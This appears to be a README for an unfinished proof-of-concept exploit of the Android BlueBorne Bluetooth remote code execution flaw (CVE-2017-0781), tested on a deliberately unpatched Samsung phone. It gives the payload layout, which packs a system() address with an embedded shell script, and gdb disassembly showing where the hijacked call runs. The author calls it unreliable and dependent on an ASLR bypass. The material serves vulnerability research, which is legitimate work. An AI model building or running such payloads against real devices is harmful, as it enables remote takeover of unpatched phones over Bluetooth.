# android712-blueborne (Work in progress - dirty code)

For testing purposes removed the CVE-2017-0781 pathces and compiled 7.1.2 (LineageOS CM 14.1) on my Samsung S3 Neo+ GT-9301I

Android Blueborne RCE CVE-2017-0781

Tricky to pull off.... not reliable. Since you have to know REMOTE_NAME address, as well as defeate ALSR.

Control r4 register which is REMOTE_NAME

Payload is:
```
SHELL_SCRIPT = b'touch /tmp/test'

Payload is: '"\x17AAAAAAsysm";\n<bash_commands>\n#'
'sysm' is the address of system() from libc. The *whole* payload is a shell script.
0x1700 == (0x1722 & 0xff00) is the "event" of a "HORRIBLE_HACK" message.
payload = struct.pack('<III', 0x41411722, 0x41414141, system_addr) + b'";\n' + SHELL_SCRIPT + b'\n#'
```

After dozen of executions got this condition in

bt_workqueue

```
(gdb) x/30i 0xacda11c4
=> 0xacda11c4:	ldrh	r1, [r4, #0]
   0xacda11c6:	bic.w	r0, r1, #255	; 0xff
   0xacda11ca:	cmp.w	r0, #5632	; 0x1600
   0xacda11ce:	bge.n	0xacda11ec
   0xacda11d0:	cmp.w	r0, #4096	; 0x1000
   0xacda11d4:	beq.n	0xacda1206
   0xacda11d6:	cmp.w	r0, #4352	; 0x1100
   0xacda11da:	beq.n	0xacda1230
   0xacda11dc:	cmp.w	r0, #4608	; 0x1200
   0xacda11e0:	bne.n	0xacda1250
   0xacda11e2:	mov	r0, r4
   0xacda11e4:	ldmia.w	sp!, {r4, lr}
   0xacda11e8:	b.w	0xacd738a4
   0xacda11ec:	beq.n	0xacda123a
   0xacda11ee:	cmp.w	r0, #6400	; 0x1900
   0xacda11f2:	beq.n	0xacda1246
   0xacda11f4:	cmp.w	r0, #5888	; 0x1700
   0xacda11f8:	bne.n	0xacda1250
   0xacda11fa:	ldr	r1, [r4, #8]
   0xacda11fc:	mov	r0, r4
   0xacda11fe:	blx	r1
   0xacda1200:	ldr	r0, [pc, #92]	; (0xacda1260)
   0xacda1202:	add	r0, pc
```

As we can see our system call should be executed on  0xacda11fe

